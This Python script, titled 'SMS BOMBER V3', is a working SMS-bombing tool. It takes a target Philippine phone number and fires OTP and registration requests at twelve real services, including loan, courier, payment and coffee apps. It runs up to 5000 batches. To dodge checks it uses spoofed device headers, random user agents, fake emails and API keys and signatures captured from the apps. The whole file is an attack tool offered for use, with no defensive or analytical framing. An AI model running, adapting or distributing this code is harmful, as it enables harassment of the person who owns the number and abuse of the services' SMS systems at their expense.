import requests
import random
import string
import time
import sys
from urllib.parse import urlencode
from datetime import datetime
import asyncio
import aiohttp

class Colors:
    RESET = '\033[0m'
    BRIGHT = '\033[1m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'

def color_text(text, color):
    color_code = getattr(Colors, color.upper(), Colors.RESET)
    return f"{color_code}{text}{Colors.RESET}"

def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"

def show_banner():
    banner = """
 ██████╗ ██████╗ ██████╗ ███████╗    ███████╗███╗   ███╗███████╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝    ██╔════╝████╗ ████║██╔════╝
██║     ██║   ██║██║  ██║█████╗      ███████╗██╔████╔██║███████╗
██║     ██║   ██║██║  ██║██╔══╝      ╚════██║██║╚██╔╝██║╚════██║
╚██████╗╚██████╔╝██████╔╝███████╗    ███████║██║ ╚═╝ ██║███████║
 ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝     ╚═╝╚══════╝
                                                                 
              ██████╗ ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
             ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
             ██║     ██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
             ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
             ╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
              ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                 
                       TOOL CREATED BY RIO | SMS BOMBER V3
    """
    print(color_text(banner, 'cyan'))

async def send_ezloan(session, number):
    url = 'https://gateway.ezloancash.ph/security/auth/otp/request'
    headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'accept-language': 'en',
        'imei': 'e933e51d8c994b05b5a0d523c84f8287',
        'device': 'android',
        'buildtype': 'release',
        'brand': 'POCO',
        'model': '2207117BPG',
        'manufacturer': 'Xiaomi',
        'source': 'EZLOAN',
        'channel': 'GooglePlay_Blue',
        'appversion': '2.0.4',
        'appversioncode': '2000402',
        'version': '2.0.4',
        'versioncode': '2000401',
        'sysversion': '15',
        'sysversioncode': '35',
        'customerid': '',
        'businessid': 'EZLOAN',
        'phone': '',
        'appid': 'EZLOAN',
        'authorization': '',
        'blackbox': 'qGPG61760445001tnR5bweVKGe',
        'Cookie': 'sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk5ZTJiMjEyYmMxMTgtMGRhOTM1OTY4MjdlNDc4LTM3NjYxMzMzLTM0MzA4OS0xOTllMmIyMTJiZDliIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%7D; _fbp=fb.1.1760444945208.257083461139881056'
    }
    data = {
        "businessId": "EZLOAN",
        "contactNumber": number,
        "appsflyerIdentifier": "1760444943092-3966994042140191452"
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=10) as response:
            print(color_text('   [SENT] EZLOAN', 'green'))
            return True
    except:
        print(color_text('   [FAILED] EZLOAN', 'red'))
        return False

async def send_xpress(session, number, batch):
    url = 'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp'
    headers = {
        'User-Agent': 'Dalvik/2.1.0',
        'Content-Type': 'application/json'
    }
    data = {
        'FirstName': 'user',
        'LastName': 'test',
        'Email': f'user{int(time.time())}_{batch}@gmail.com',
        'Phone': number,
        'Password': 'Pass1234',
        'ConfirmPassword': 'Pass1234',
        'FingerprintVisitorId': FINGERPRINT_VISITOR_ID,
        'FingerprintRequestId': FINGERPRINT_REQUEST_ID
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] XPRESS PH', 'green'))
            return True
    except:
        print(color_text('   [FAILED] XPRESS PH', 'red'))
        return False

async def send_abenson(session, number):
    url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
    headers = {
        'User-Agent': 'okhttp/4.9.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = urlencode({'contact_no': number, 'login_token': 'undefined'})
    try:
        async with session.post(url, data=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] ABENSON', 'green'))
            return True
    except:
        print(color_text('   [FAILED] ABENSON', 'red'))
        return False

async def send_excellent(session, number):
    coordinates = [
        {'lat': '14.5995', 'long': '120.9842'},
        {'lat': '14.6760', 'long': '121.0437'},
        {'lat': '14.8648', 'long': '121.0418'}
    ]
    user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
    coord = random.choice(coordinates)
    agent = random.choice(user_agents)
    
    url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
    headers = {
        'User-Agent': agent,
        'Content-Type': 'application/json; charset=utf-8',
        'x-latitude': coord['lat'],
        'x-longitude': coord['long']
    }
    data = {
        'domain': number,
        'cat': 'login',
        'previous': False,
        'financial': 'efe35521e51f924efcad5d61d61072a9'
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] EXCELLENT LENDING', 'green'))
            return True
    except:
        print(color_text('   [FAILED] EXCELLENT LENDING', 'red'))
        return False

async def send_fortune(session, number):
    url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
    headers = {
        'User-Agent': 'Dart/3.6 (dart:io)',
        'Content-Type': 'application/json',
        'app-type': 'GOOGLE_PLAY',
        'authorization': 'Bearer',
        'app-version': '4.3.5',
        'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
        'timestamp': str(int(time.time() * 1000)),
        'nonce': f'{random_string(10)}-{int(time.time() * 1000)}'
    }
    data = {
        'deviceId': 'c31a9bc0-652d-11f0-88cf-9d4076456969',
        'deviceType': 'GOOGLE_PLAY',
        'companyId': '4bf735e97269421a80b82359e7dc2288',
        'dialCode': '+63',
        'phoneNumber': number.lstrip('0')
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] FORTUNE PAY', 'green'))
            return True
    except:
        print(color_text('   [FAILED] FORTUNE PAY', 'red'))
        return False

async def send_wemove(session, number):
    url = 'https://api.wemove.com.ph/auth/users'
    headers = {
        'User-Agent': 'okhttp/4.9.3',
        'Content-Type': 'application/json',
        'xuid_type': 'user',
        'source': 'customer',
        'authorization': 'Bearer'
    }
    data = {
        'phone_country': '+63',
        'phone_no': number.lstrip('0')
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] WEMOVE', 'green'))
            return True
    except:
        print(color_text('   [FAILED] WEMOVE', 'red'))
        return False

async def send_pinoy_coop(session, number):
    url = 'https://api.pinoycoop.com/notification/otp'
    headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Content-Type': 'application/json',
        'authorization': 'Bearer'
    }
    data = {
        'phone': '63' + number.lstrip('0'),
        'branch_code': '700'
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] PINOY COOP', 'green'))
            return True
    except:
        print(color_text('   [FAILED] PINOY COOP', 'red'))
        return False

async def send_lbc(session, number):
    url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
    headers = {
        'User-Agent': 'Dart/2.19 (dart:io)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = urlencode({
        'verification_type': 'mobile',
        'client_email': f'{random_string(8)}@gmail.com',
        'client_contact_code': '+63',
        'client_contact_no': number.lstrip('0'),
        'app_log_uid': random_string(16)
    })
    try:
        async with session.post(url, data=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] LBC CONNECT', 'green'))
            return True
    except:
        print(color_text('   [FAILED] LBC CONNECT', 'red'))
        return False

async def send_pickup(session, number):
    url = 'https://production.api.pickup-coffee.net/v2/customers/login'
    headers = {
        'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']),
        'Content-Type': 'application/json'
    }
    formatted = number if number.startswith('+63') else ('+63' + number.lstrip('0'))
    data = {
        'mobile_number': formatted,
        'login_method': 'mobile_number'
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] PICKUP COFFEE', 'green'))
            return True
    except:
        print(color_text('   [FAILED] PICKUP COFFEE', 'red'))
        return False

async def send_lista(session, number):
    url = 'https://api-v2.lista.systems/auth/otp/mpin'
    headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Content-Type': 'application/json',
        'appdevice-brand': 'POCO',
        'appdevice-buildnumber': '100000619',
        'appdevice-bundleid': 'com.listaPh',
        'appdevice-islocationenabled': 'false',
        'appdevice-manufacturer': 'Xiaomi',
        'appdevice-readableversion': '3.9.57',
        'appdevice-modelname': '2207117BPG',
        'appdevice-uniqueid': random_string(16),
        'appdevice-os': 'android',
        'app-version': '3.9.57'
    }
    formatted = number if number.startswith('+63') else ('+63' + number.lstrip('0'))
    data = {'phoneNumber': formatted}
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] LISTA SYSTEMS', 'green'))
            return True
    except:
        print(color_text('   [FAILED] LISTA SYSTEMS', 'red'))
        return False

async def send_honey(session, number):
    url = 'https://api.honeyloan.ph/api/client/registration/step-one'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
        'Content-Type': 'application/json'
    }
    data = {
        'phone': number,
        'is_rights_block_accepted': 1
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] HONEY LOAN', 'green'))
            return True
    except:
        print(color_text('   [FAILED] HONEY LOAN', 'red'))
        return False

async def send_komo(session, number):
    url = 'https://api.komo.ph/api/otp/v5/generate'
    headers = {
        'Content-Type': 'application/json',
        'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
        'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
    }
    data = {
        'mobile': number,
        'transactionType': 6
    }
    try:
        async with session.post(url, json=data, headers=headers, timeout=8) as response:
            print(color_text('   [SENT] KOMO PH', 'green'))
            return True
    except:
        print(color_text('   [FAILED] KOMO PH', 'red'))
        return False

async def send_batch(number, formatted_num, batch):
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_ezloan(session, number),
            send_xpress(session, formatted_num, batch),
            send_abenson(session, number),
            send_excellent(session, number),
            send_fortune(session, number),
            send_wemove(session, number),
            send_pinoy_coop(session, number),
            send_lbc(session, number),
            send_pickup(session, formatted_num),
            send_lista(session, formatted_num),
            send_honey(session, number),
            send_komo(session, number)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if r is True), sum(1 for r in results if r is not True)

async def sms_bomb():
    try:
        show_banner()
        
        print(color_text('[INFO] PHONE FORMAT: 09123456789 / 9123456789', 'yellow'))
        
        number_input = input(color_text('[INPUT] ENTER TARGET NUMBER: ', 'blue'))
        amount_input = input(color_text('[INPUT] ENTER AMOUNT (MAX 5000): ', 'blue'))
        
        clean_number = number_input.replace(' ', '')
        
        import re
        if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', clean_number):
            print(color_text('[ERROR] INVALID PHONE NUMBER FORMAT!', 'red'))
            return
        
        try:
            amount = int(amount_input)
        except:
            amount = 100
        
        if amount > 5000:
            print(color_text('[WARNING] AMOUNT SET TO MAX 5000', 'yellow'))
            amount = 5000
        
        if amount < 1:
            print(color_text('[ERROR] AMOUNT MUST BE AT LEAST 1', 'red'))
            return
        
        number_to_send = clean_number
        formatted_num = (number_to_send if number_to_send.startswith('+63') else
                        '+63' + number_to_send[1:] if number_to_send.startswith('09') else
                        '+63' + number_to_send if number_to_send.startswith('9') else number_to_send)
        
        print(color_text('\n[STATUS] STARTING SMS BOMB ATTACK', 'green'))
        print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
        print(color_text(f'[AMOUNT] {amount} BATCHES', 'cyan'))
        print(color_text('[PROCESS] INITIATING...\n', 'yellow'))
        
        success_count = 0
        fail_count = 0
        
        for i in range(1, amount + 1):
            print(color_text(f'[BATCH] {i}/{amount}', 'magenta'))
            
            batch_success, batch_fail = await send_batch(number_to_send, formatted_num, i)
            success_count += batch_success
            fail_count += batch_fail
            
            print(color_text(f'[STATS] BATCH: {i}/{amount} | SUCCESS: {success_count} | FAILED: {fail_count}', 'cyan'))
            
            delay = random.uniform(1, 3)
            await asyncio.sleep(delay)
        
        print(color_text('\n[COMPLETE] SMS BOMB ATTACK FINISHED', 'green'))
        print(color_text(f'[SUCCESS] {success_count} REQUESTS', 'green'))
        print(color_text(f'[FAILED] {fail_count} REQUESTS', 'red'))
        print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
        print(color_text(f'[BATCHES] {amount}', 'cyan'))
        print(color_text('\n[CREDITS] TOOL CREATED BY RIO', 'magenta'))
        
    except KeyboardInterrupt:
        print(color_text('\n[STOPPED] PROCESS TERMINATED BY USER', 'yellow'))
        sys.exit(0)
    except Exception as e:
        print(color_text('[ERROR] SYSTEM FAILURE', 'red'))
        print(color_text(f'[DEBUG] {str(e)}', 'red'))

if __name__ == '__main__':
    try:
        asyncio.run(sms_bomb())
    except KeyboardInterrupt:
        print(color_text('\n[STOPPED] PROCESS TERMINATED BY USER', 'yellow'))
        sys.exit(0)
